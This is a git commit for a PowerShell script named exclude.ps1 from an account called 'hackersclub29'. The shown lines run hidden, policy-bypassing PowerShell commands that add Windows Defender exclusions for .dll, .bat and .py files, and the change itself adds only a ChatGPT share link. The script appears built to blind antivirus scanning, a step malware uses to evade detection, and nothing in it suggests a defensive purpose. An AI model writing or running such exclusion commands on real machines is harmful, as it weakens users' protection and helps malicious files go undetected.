029571622670abbbabc09194c8a6bca709f4960a
hackersclub29 <57355685+hackersclub29@users.noreply.github.com>
2024-06-24 14:28:02 -0400

    Update exclude.ps1

--- exclude.ps1
+++ exclude.ps1
@@ -3,3 +3,6 @@ powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy B
 powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.dll'"
 powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.bat'"
 powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionExtension '.py'"
+
+
+https://chatgpt.com/share/91b98844-f123-4386-9c60-9b99edfab481
